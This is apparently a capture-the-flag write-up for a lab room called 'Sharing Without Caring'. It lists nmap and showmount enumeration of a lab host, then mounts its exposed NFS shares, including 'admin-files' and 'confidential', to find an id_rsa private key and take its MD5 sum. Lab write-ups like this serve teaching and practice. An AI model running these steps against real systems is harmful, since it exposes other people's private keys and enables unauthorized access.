# Sharing Without Caring

Machine IP
```bash
export IP=10.10.232.8
```

## Enumerate

```bash
nmap -sV -sC -Pn -oN nmap/initial $IP
```

## What is saring on NFS

```bash
showmount -e $IP
```

## mount shares

```bash
mkdir -p shares/my-notes && \
sudo mount $IP:/my-notes shares/my-notes

[sudo] password for pen-tester: 
mount.nfs: access denied by server while mounting 10.10.232.8:/my-notes
```

But `share` is mounted!
```bash
mkdir -p shares/share && \
sudo mount $IP:/share shares/share
```

## Find id_rsa

```bash
mkdir -p shares/admin-files && \
sudo mount $IP:/admin-files shares/admin-files

mkdir -p shares/confidential && \
sudo mount $IP:/confidential shares/confidential
```

## What is the MD5 sum of id_rsa?

```bash
sudo md5sum id_rsa
```